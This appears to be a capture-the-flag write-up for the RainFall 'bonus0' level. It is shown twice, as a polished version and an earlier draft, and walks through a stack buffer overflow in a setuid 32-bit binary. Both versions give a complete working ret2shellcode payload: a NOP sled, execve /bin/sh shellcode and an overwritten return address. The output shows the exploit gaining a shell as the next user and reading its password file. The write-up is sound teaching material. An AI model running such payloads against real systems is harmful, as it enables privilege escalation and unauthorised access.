# BONUS 00 - Stack Buffer Overflow → ret2shellcode

> Vulnerability class: Stack Buffer Overflow
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file

---

## Overview

The program reads two inputs at runtime and concatenates them. By injecting a NOP sled and shellcode in the first input, and a crafted return address in the second, we redirect EIP into our shellcode on the stack.

---

## 1. Reconnaissance

```bash
$ file bonus0
bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
```
```bash
$ checksec --file ./bonus0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./bonus0
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 Program behavior

The program prompts twice with `-` and concatenates both inputs before printing:

```bash
$ ./bonus0
-
hello
-
world
hello world
```

With large inputs it segfaults:

```bash
$ ./bonus0
-
AAAA....(84 A's)
-
BBBB....(84 B's)
AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB���
Segmentation fault
```

### 2.2 Identifying the overflow

In GDB, large inputs confirm EIP is overwritten by the second input:

```bash
(gdb) run
-
AAAA...(84 A's)
-
BBBB...(20 B's)
Program received signal SIGSEGV
eip = 0x42424242
```

To pinpoint the exact offset within the second input, we use distinct 4-byte groups:

```bash
-
AAAA...(84 A's)
-
CCCCDDDDEEEEFFFFGGGG

Program received signal SIGSEGV
eip = 0x46454545    ← "EEEF"
```

`0x46454545` = `FEEE` in little-endian → EIP is overwritten starting at byte **9** of the second input, spanning 4 bytes (`EEEF`). The offset is therefore:

```
[ 9 bytes padding ] [ 4 bytes EIP ] [ 7 bytes trailing ]
```

Regardless of how long the first input is, the offset within the second input stays fixed at 9.

---

## 3. Vulnerability

The `p()` function reads input into a fixed stack buffer without bounds checking. The two reads each write into separate stack buffers, and the subsequent concatenation copies both into a third buffer — overflowing its bounds and reaching the saved return address.

---

## 4. Exploitation

### 4.1 Strategy

Since NX is disabled and ASLR is off:

- First input: NOP sled + shellcode injected directly onto the stack
- Second input: 9 bytes padding + stack address pointing into the NOP sled + 7 bytes trailing

### 4.2 Locate the shellcode on the stack

We break after `p()` reads the first input and inspect the stack:

```bash
(gdb) break *p+58
(gdb) run < <(python -c 'print "\x90" * 200 + "<shellcode>"')

(gdb) x/500x $esp
0xbfffe670:    0x90909090    0x90909090    ...
0xbfffe6d0:    0x90909090    0x90909090    ← middle of NOP sled
0xbfffe730:    0xdb31c031    0x80cd06b0    ← shellcode starts
```

We pick `0xbfffe6d0` as our return address — safely in the middle of the NOP sled.

### 4.3 Payload construction

```
input 1: [ \x90 × 200 ] + [ shellcode ]
input 2: [ "B" × 9 ] + [ 0xbfffe6d0 ] + [ "C" × 7 ]
```

- 200 NOP bytes give a wide landing zone before the shellcode
- 9 bytes of padding fill the stack up to the saved EIP
- `\xd0\xe6\xff\xbf` overwrites EIP with the NOP sled address
- 7 trailing bytes pad the remaining space after EIP

### 4.4 Feeding two runtime inputs

Since the program reads from stdin twice interactively, we chain two `python -c` commands and keep stdin open with `cat`:

```bash
(python -c 'CMD1'; python -c 'CMD2'; cat) | ./bonus0
```

### 4.5 Execution

```bash
$ (python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 9 + "\xd0\xe6\xff\xbf" + "C" * 7'; cat) | ./bonus0
-
-
��������������������BBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
$ whoami
bonus1
$ cat /home/user/bonus1/.pass
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

---

## 5. Key Takeaways

| Concept | Detail |
|---|---|
| Two-input overflow | First input places shellcode on stack, second input controls EIP |
| Fixed offset independence | The EIP offset within input 2 is fixed regardless of input 1 length |
| NOP sled reliability | 200 NOP bytes give a wide landing zone, tolerating minor address variation between GDB and shell |
| stdin chaining | `(cmd1; cmd2; cat) | ./bin` is the correct pattern for programs with multiple interactive reads |
| Stack shellcode | With NX off and ASLR off, the stack is directly executable — no heap or env var needed |










##### V11111111








# BONUS0

## Analysis:

First let's try to use the program:
```bash
   bonus0@RainFall:~$ ./bonus0 
   - 
   salut 
   - 
   toi
   salut  toi
   bonus0@RainFall:~$ ./bonus0 popopopopo
   - 
   $(python -c 'print "AAAA" * 100')
   - 
   BBBB
   $(python -c 'print "BBBB BBBB
   bonus0@RainFall:~$ ./bonus0 popopopopo
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
   Segmentation fault (core dumped)
```
It seems the program takes 2 inputs during runtime and prints them, but with large inputs it has a weird behaviour and segfaults. 

Let's try to check what happens in gdb:
```gdb
(gdb) run
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   AAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

   Program received signal SIGSEGV, Segmentation fault.
   0x42424242 in ?? ()
```

It seems that we overflowed the EIP register, a good sign for our attack but let's confirm it:
```
   (gdb) info registers
   eax            0x0      0
   ecx            0xffffffff       -1
   edx            0xb7fd28b8       -1208145736
   ebx            0xb7fd0ff4       -1208152076
   esp            0xbffff730       0xbffff730
   ebp            0x42424242       0x42424242
   esi            0x0      0
   edi            0x0      0
   eip            0x42424242       0x42424242
   eflags         0x210282 [ SF IF RF ID ]
   cs             0x73     115
   ss             0x7b     123
   ds             0x7b     123
   es             0x7b     123
   fs             0x0      0
   gs             0x33     51
```

That's perfect, EIP is overflowed with our second input but we need to find the correct offset to properly take control of 
our program.

After some test (not changing first input) we can see that if we give 20 B's as second input it still segfaults:
```
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   BBBBBBBBBBBBBBBBBBBB
   AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

   Program received signal SIGSEGV, Segmentation fault.
   0x42424242 in ?? ()
```
Now let's just send CCCCDDDDEEEEFFFFGGGG and not BBBBBBBBBBBBBBBB, it will help us define which bytes overflow the EIP:
```
   (gdb) run
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   CCCCDDDDEEEEFFFFGGGG
   AAAAAAAAAAAAAAAAAAAACCCCDDDDEEEEFFFFGGGG��� CCCCDDDDEEEEFFFFGGGG���

   Program received signal SIGSEGV, Segmentation fault.
   0x46454545 in ?? ()
```
Ok so we now know that the part between quotes in CCCCDDDDE"EEEF"FFFGGGG so "EEEFF" is overflowwing our EIP.
Therefore, if we give same first input and as second input 9 + address + 7, we should be able to exploit the vulnerability.

As shown below, if we provide a larger input as first argument, it actually doesn's change the offset if input 2 stays the same:
```
   Starting program: /home/user/bonus0/bonus0 
   - 
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - 
   CCCCDDDDEEEEFFFFGGGG
   AAAAAAAAAAAAAAAAAAAACCCCDDDDEEEEFFFFGGGG��� CCCCDDDDEEEEFFFFGGGG���

   Program received signal SIGSEGV, Segmentation fault.
   0x46454545 in ?? ()
```

## Solution

We can try to create a NOP sled with a shellcode in first command and and use the second command to point to that NOP sled.
First, the right way to give two inputs to such program that uses 2 reads during runtime is the following: 
(python -c 'CMD'; python -c 'CMD') | ./bin.

But the first step is to check where our first input would land by breaking after read. Indeed, this line
is a common use to get the address of a local variable on the stack so it might be what we're looking for:
```
   bonus0@RainFall:~$ gdb ./bonus0 
   (gdb) break *p+58
   Breakpoint 2 at 0x80484ee
   (gdb) run < <(python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
   Breakpoint 2, 0x080484ee in p ()
   (gdb) x/500x $esp
   0xbfffe660:     0x00000000      0x0000000a      0x00001000      0x00000000
   0xbfffe670:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe680:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe690:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6a0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6b0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6c0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6d0:     0x90909090      0x90909090      0x90909090      0x90909090 <=====
   0xbfffe6e0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe6f0:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe700:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe710:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe720:     0x90909090      0x90909090      0x90909090      0x90909090
   0xbfffe730:     0x90909090      0x90909090      0xdb31c031      0x80cd06b0
   0xbfffe740:     0x742f6853      0x2f687974      0x89766564      0x66c931e3
   0xbfffe750:     0xb02712b9      0x3180cd05      0x2f6850c0      0x6868732f
   0xbfffe760:     0x6e69622f      0x5350e389      0xb099e189      0x0a80cd0b
```

This does look like our NOP Slep + shellcode ! so let's choose an address in the middle of our NOPs for our payload, this one 0xbfffe6d0:
```bash 
   
   bonus0@RainFall:~$ (python -c 'print "\x90" * 200 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'; python -c 'print "B" * 9 + "\xd0\xe6\xff\xbf" + "C" * 7'; cat) | ./bonus0
   - 
   - 
   ��������������������BBBBBBBBB����CCCCCCC��� BBBBBBBBB����CCCCCCC���
   $ whoami
   bonus1
   $ cat /home/user/bonus1/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```